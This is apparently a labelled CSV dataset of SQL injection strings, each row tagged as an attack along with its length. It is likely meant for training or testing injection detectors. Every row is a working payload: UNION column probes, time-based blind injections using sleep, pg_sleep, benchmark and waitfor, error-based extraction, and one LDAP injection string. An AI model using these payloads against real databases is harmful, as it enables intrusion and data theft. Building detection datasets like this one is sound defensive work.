sentence,attack_type,len_payload
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,277
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""pHWY"" LIKE ""pHWY",1,296
""" UNION ALL SELECT NULL, NULL, NULL-- AND ""cnYM"" LIKE ""cnYM",1,59
"-6681"" )  or 5251 = 1162",1,24
"1""  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( ""whld"" = ""whld",1,161
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'oygE' = 'oygE",1,203
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'TJyE' = 'TJyE",1,174
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'jarF' LIKE 'jarF",1,81
"1%""  )  )   union all select null,null,null,null,null,null,null,null,null#",1,74
1 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) ,1,61
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""OvYt"" LIKE ""OvYt",1,148
" select * from users where id = 1 <@. union select 1,version (  )  -- 1",1,70
-3613%' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( ,1,254
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""XVRI"" = ""XVRI",1,290
1%'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1,75
1' )  where 3893 = 3893,1,23
""",NULL,NULL,NULL,NULL,NULL,NULL,NULL )  waitfor delay '0:0:20' /*",1,65
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""RQsW"" LIKE ""RQsW",1,200
-4901 )  or 3407 = 6442#,1,24
"1"" )  where 4180 = 4180 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,163
"-8128""  )  )   as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1,104
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""DFWG"" LIKE ""DFWG",1,317
"1%"" )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1,182
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 182 = 182",1,150
"1""  )  )   and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (  ""yrgy"" like ""yrgy",1,123
-2483' where 1327 = 1327 union all select 1327#,1,47
"1%""  )  )   and 7533 = 7533 and   (  (  ""%"" = """,1,47
"1'  )  )   )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( 'fzgy' = 'fzgy",1,315
"1'  )  )   union all select null,null,null,null,null,null,null,null--",1,69
"1 )  where 2679 = 2679 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,127
" AND 5650 = CONVERT ( INT, ( UNION ALL SELECTCHAR ( 73 ) +CHAR ( 78 ) +CHAR ( 74 ) +CHAR ( 69 ) +CHAR ( 67 ) +CHAR ( 84 ) +CHAR ( 88 ) +CHAR ( 118 ) +CHAR ( 120 ) +CHAR ( 80 ) +CHAR ( 75 ) +CHAR ( 116 ) +CHAR ( 69 ) +CHAR ( 65 ) +CHAR ( 113 ) +CHAR ( 112 ) +CHAR ( 106 ) +CHAR ( 107  )  )   ) ",1,291
1 )  as xylu where 3338 = 3338 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1,95
"sn;s: select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1,60
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'ORjH' = 'ORjH",1,277
"-7851""  )  )   or 6872 = 6872 and   (  (  ""dvbw"" like ""dvbw",1,59
"1' )  where 7658 = 7658 union all select null,null#",1,51
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'bDfF' LIKE 'bDfF",1,273
1'+ ( select 'kcix' where 1117 = 1117,1,37
" ) ; CREATE OR REPLACE FUNCTION SLEEP ( int )  RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep ( 5 ) ;--",1,129
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'QqSw' = 'QqSw",1,89
1 )  where 9552 = 9552 and 1961 = 6333--,1,40
"""  )  )   )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (   ( ""PBwR"" LIKE ""PBwR",1,302
UE1,1,3
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,316
1' where 1045 = 1045 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --,1,73
"1', ( select  ( case when  ( 5217 = 5217 )  then 1 else 5217* ( select 5217 from mysql.db )  end  )  )  ",1,102
"-9588'  )  )   union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",1,83
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,1,141
"select * from generate_series ( 7754,7754,case when  ( 7754 = 1252 )  then 1 else 0 end )  limit 1--",1,100
"1' )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,117
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  -- ygbf",1,85
"1%""  )  )   and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  ""%"" = """,1,303
1'|| ( select 'svnn' from dual where 8710 = 8710,1,48
"1"" )  as lipa where 3450 = 3450 and make_set ( 8403 = 8403,8899 ) --",1,68
-9564 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ),1,255
"1%"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""%"" = """,1,286
"1%""  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,72
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""aAvw"" = ""aAvw",1,114
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 2185 = 2185",1,255
' )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND  ( 'WeUQ' = 'WeUQ,1,278
"1%'  )  )   )  union all select null,null,null--",1,48
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",1,74
"1'+ ( select pwvr where 3028 = 3028 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,119
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'tKoF' = 'tKoF",1,312
1 )  union all select null--,1,28
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5867 = 5867",1,281
"1'+ ( select pxsd where 2576 = 2576 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666  )  )  +'",1,157
"  )  )   UNION ALL SELECT NULL, NULL, NULL# AND   (  (  8786 = 8786",1,65
"1  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  1402 = 1402",1,298
"1'|| ( select 'dukt' where 3206 = 3206 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1,206
"' UNION ALL SELECT NULL, NULL, NULL#",1,36
1'  )  )   )  and  ( 5995 = 9618 ) *9618 and   (  (   ( 'nagr' like 'nagr,1,73
"1 and elt ( 4249 = 4249,7259 ) ",1,30
"-9007 )  as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1,97
1 )  as tbve where 4828 = 4828,1,30
"-5925 )  where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,89
'; WAITFOR DELAY '0:0:5';-- AND 'lDTn' LIKE 'lDTn,1,49
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'jgfG' = 'jgfG",1,330
1 )  as gbtj where 8175 = 8175,1,30
"1"" and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,43
"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",1,57
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1,115
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'JJti' = 'JJti",1,216
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'cGQX' LIKE 'cGQX",1,339
1' )  as znak where 5203 = 5203,1,31
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""UCTY"" = ""UCTY",1,146
"1"" and sleep ( 5 ) #",1,20
"1 where 2674 = 2674 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,125
%2A%28%7C%28objectclass%3D%2A%29%29,1,35
"1"" )  as eoer where 8667 = 8667 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",1,84
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,291
"-6307' where 8916 = 8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1,78
' )  AND 1492 = 4010-- AND  ( 'IggO' = 'IggO,1,44
"""  )  )   )  AND 4605 =  ( SELECT UPPER ( XMLType ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 4605 = 4605 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 ) ||CHR ( 62  )  )   )  FROM DUAL )  AND   (  (   ( ""nqAF"" = ""nqAF",1,338
"-3829%"" )  union all select 2218,2218,2218,2218,2218,2218,2218--",1,64
new question ' select * from polls_question,1,43
" select * from users where id = 1 or ""@;"" = 1 or 1 = 1 -- 1",1,58
"1""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""rsru"" = ""rsru",1,95
"-6368' union all select 6529,6529,6529--",1,40
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""vGRV"" = ""vGRV",1,329
 ELSE 2182* ( SELECT 2182 FROM mysql.db )  END  )  )  ,1,51
"-4639""  )  )   )  or 8550 = 9348",1,32
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,319
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""dmEP"" = ""dmEP",1,307
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'Jogg' LIKE 'Jogg",1,106
"1""  )  )   and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""ycuo"" like ""ycuo",1,144
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'DZil' LIKE 'DZil",1,278
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND 'FgLj' = 'FgLj",1,67
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'pkfe' = 'pkfe",1,276
" UNION ALL SELECT 1,2,3,4,5,6,7,8-- ",1,34
""" )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND  ( ""noxZ"" = ""noxZ",1,282
"1%'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( '%' = '",1,249
select  ( case when  ( 5856 = 7176 )  then 5856 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,115
'-',1,3
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""RRAY"" = ""RRAY",1,235
"1' )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'pgyl' = 'pgyl",1,102
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""SBwG"" LIKE ""SBwG",1,94
"1 )  as zdym where 1578 = 1578 union all select null,null,null#",1,63
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""FuOm"" LIKE ""FuOm",1,202
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte' = 'nkte",1,117
-9541 where 4291 = 4291 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ,1,254
"-9656"" union all select 8735,8735--",1,35
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'wTvk' = 'wTvk",1,270
"1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'obeh' = 'obeh",1,93
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1,59
-8753 )  order by 1#,1,20
"1'  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  'pcim' = 'pcim",1,302
"1%""  )  )   )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (   ( ""%"" = """,1,148
"-6335""  )  )   )  union all select 3654--",1,41
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#",1,310
"s, ) s: select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1,68
"s,{s: select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1,60
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  ( 'fnon' like 'fnon",1,111
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5903 = 5903",1,197
"1 )  as mnyy where 4409 = 4409 union all select null,null,null,null--",1,69
-5152'  )  )   or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr (,1,255
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""jXcc"" LIKE ""jXcc",1,274
"' AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND 'akJb' = 'akJb",1,277
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""vKOm"" LIKE ""vKOm",1,171
select case when 8514 = 3207 then 1 else null end--,1,51
"1'  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  'skdm' = 'skdm",1,152
-4389'  )  )   )  or  ( 1139 = 3499 ) *3499 and   (  (   ( 'qoch' = 'qoch,1,73
"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--",1,89
" select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1,77
"1""  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( ""tkkg"" = ""tkkg",1,126
"select count ( * )  from generate_series ( 1,5000000 )  and ""xcjt"" = ""xcjt",1,74
" select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1,54
"1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,192
"1 )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( 6786 = 6786",1,79
